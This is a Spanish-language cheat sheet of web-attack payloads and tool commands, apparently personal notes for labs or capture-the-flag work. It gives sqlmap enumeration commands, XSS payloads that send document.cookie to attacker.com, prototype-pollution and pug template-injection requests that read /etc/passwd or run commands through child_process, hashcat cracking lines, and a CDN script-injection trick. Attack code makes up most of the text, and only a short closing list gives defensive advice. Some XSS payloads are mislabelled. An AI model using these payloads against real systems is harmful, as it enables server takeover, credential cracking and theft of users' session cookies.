
## 🔍 Índice

1. Inyección SQL (SQL Injection)
    
2. Cross-Site Scripting (XSS)
    
3. Prototype Pollution
    
4. Server-Side Template Injection (SSTI)
    
5. Comandos útiles para herramientas (SQLMap, Burp Suite, Curl)
    
6. Explotación de Node.js (`pug`, `fs`, `child_process`)
    
7. Notas adicionales y recomendaciones
    

---

## 1. Inyección SQL (SQL Injection)

### 📌 Concepto

Permitir que un atacante ejecute consultas SQL no autorizadas mediante la manipulación de entradas no sanitizadas.

### 🔑 Comandos útiles

- **SQLMap:** Automatización de detección y explotación.
    
    ```bash
    sqlmap -u "http://target.com/vulnerable.php?id=1" --dbs
    sqlmap -r request.txt --ignore-code 401
    ```
    
- **Búsqueda de tablas y columnas:**
    
    ```bash
    sqlmap -u "http://target.com/vulnerable.php?id=1" --tables -D database_name
    sqlmap -u "http://target.com/vulnerable.php?id=1" --columns -D database_name -T table_name
    ```
    

---

## 2. Cross-Site Scripting (XSS)

### 📌 Concepto

Permitir que un atacante ejecute scripts en el navegador de un usuario mediante la inyección de código malicioso. 

### 🔑 Payloads comunes

- **Reflejado (Stored):**
    
    ```html
    <script>alert('XSS')</script>
    ```
    
- **DOM-Based XSS:**
    
    ```javascript
    <img src="x" onerror="alert('XSS')">
    ```
    
- **Exfiltración de cookies:**
    
    ```javascript
    <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
    ```

---

## 3. Prototype Pollution

### 📌 Concepto

Permitir que un atacante modifique el prototipo global de objetos JavaScript, afectando el comportamiento de toda la aplicación.

### 🔑 Payloads comunes

```javascript
fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        "artist.__proto__.isAdmin": true
    })
});
```

### 🔑 Verificación

```javascript
console.log({}.isAdmin); // true (indica contaminación del prototipo)
```

---

## 4. Server-Side Template Injection (SSTI) [[Inyección de Comandos]]

### 📌 Concepto

Permitir que un atacante ejecute código arbitrario en el servidor mediante la inyección de plantillas dinámicas.

### 🔑 Payloads comunes

```javascript
fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        'artist.name': "Haigh #{require('fs').readFileSync('/etc/passwd').toString()}"
    })
});
```

### 🔑 Activar modo Debug

```javascript
fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        'artist.__proto__.compileDebug': true
    })
});
```

---

## 5. Comandos útiles para herramientas

### 🔑 SQLMap

```bash
sqlmap -u "http://target.com/vulnerable.php?id=1" --dbs
```

### 🔑 Burp Suite

- Interceptar tráfico.
    
- Modificar `Host` para emular origen `127.0.0.1`.
    

### 🔑 Curl

```bash
curl -X POST http://localhost:8080/api/getfacts -H "Content-Type: application/json" -d '{"type": "secrets"}'
```

### 🔑 Hashcat

- **Descripción:** Herramienta para recuperación de contraseñas mediante ataques de fuerza bruta y diccionarios.
    
- **Ejemplo de uso:**
    

```
hashcat -a 0 -m 3200 bcrypt_hash_file rockyou.txt
```

    

```
sudo apt-get install wordlists
```

---

## 6. Explotación de Node.js (`pug`, `fs`, `child_process`)

### 📌 Concepto

Permitir ejecución de código arbitrario mediante funciones inseguras de Node.js (como `pug.compile()`).

### 🔑 Payloads para `pug`

```javascript
fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        'artist.name': "Haigh #{require('fs').readFileSync('/etc/passwd').toString()}"
    })
});
```

```javascript
fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        'artist.__proto__.block': {
            'type': 'Text',
            'line': "console.log(process.mainModule.require('child_process').execSync('whoami > /app/static/pwned').toString())"
        }
    })
});
```

---
## 7. Hashcat

### 📌 Concepto

Herramienta de recuperación de contraseñas usando ataques de fuerza bruta o diccionario.

### 🔑 Comandos básicos

```
hashcat -a 0 -m 3200 bcrypt_hash_file rockyou.txt
```


## 8. Inyección de código malicioso vía CDN

### 📌 Concepto

Aprovechar el uso de etiquetas `<script>` que referencian contenido desde CDNs para inyectar código malicioso sin modificar el código fuente de la aplicación.

### 🔑 Ejemplo

```
<script src="https://cdn.jsdelivr.net/gh/guidotss/exploit/exploit.js"></script>
```

Si una aplicación permite incluir scripts de fuentes externas (como GitHub via jsDelivr), puedes subir un archivo JavaScript malicioso a un repositorio propio y ejecutarlo en la app víctima si puedes controlar alguna parte del HTML o inyectar contenido (XSS).

### 🔑 Inyección alternativa con

```
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
```

Este método se puede usar para exfiltrar información como cookies o tokens si la aplicación no implementa correctamente políticas de seguridad como Content Security Policy (CSP).

### 📌 Uso común

- Exfiltrar cookies o datos del usuario.
    
- Cargar código adicional para explotar otras vulnerabilidades.
    
- Interacción con APIs desde el contexto del navegador víctima.
    

---
## 9 Notas adicionales

- Siempre sanitizar entradas del usuario.
    
- Usar librerías actualizadas.
    
- Hacer pruebas de seguridad automatizadas y manuales.
    
- Verificar logs del servidor para detectar errores `500` o comportamientos extraños.
    
- Si se puede [[#2. Cross-Site Scripting (XSS)]]  probar con inyección de comandos [[Inyección de Comandos]] tipo `cat ... > `